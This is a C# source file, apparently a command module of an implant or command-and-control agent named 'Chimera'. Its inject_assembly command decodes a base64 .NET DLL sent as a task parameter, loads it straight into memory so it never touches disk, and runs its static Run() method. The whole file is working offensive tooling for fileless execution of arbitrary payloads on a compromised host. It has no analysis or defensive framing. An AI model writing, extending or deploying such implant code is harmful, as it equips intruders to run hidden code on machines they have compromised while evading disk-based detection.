using System;
using System.Reflection;

namespace Chimera.Commands
{
    // inject_assembly -- loads a base64-encoded .NET DLL from the task parameter
    // into memory via Assembly.Load() and calls its public static Run() method.
    // The assembly never touches disk.
    public static class InjectAssembly
    {
        public static string Execute(string parameters)
        {
            try
            {
                if (string.IsNullOrEmpty(parameters))
                    return "[error] No assembly_b64 provided. Send a base64-encoded .NET DLL.";

                byte[] assemblyBytes;
                try { assemblyBytes = Convert.FromBase64String(parameters.Trim()); }
                catch { return "[error] Failed to base64-decode the assembly. Check the encoding."; }

                Assembly asm = Assembly.Load(assemblyBytes);

                MethodInfo runMethod = null;
                foreach (Type t in asm.GetTypes())
                {
                    runMethod = t.GetMethod("Run",
                        BindingFlags.Public | BindingFlags.Static,
                        null, Type.EmptyTypes, null);
                    if (runMethod != null) break;
                }

                if (runMethod == null)
                    return "[error] No public static Run() method found in the assembly.";

                object result = runMethod.Invoke(null, null);
                string output = result != null ? result.ToString() : "[+] Run() completed (no return value).";
                return "[+] Assembly loaded and Run() executed.\n" + output;
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }
    }
}
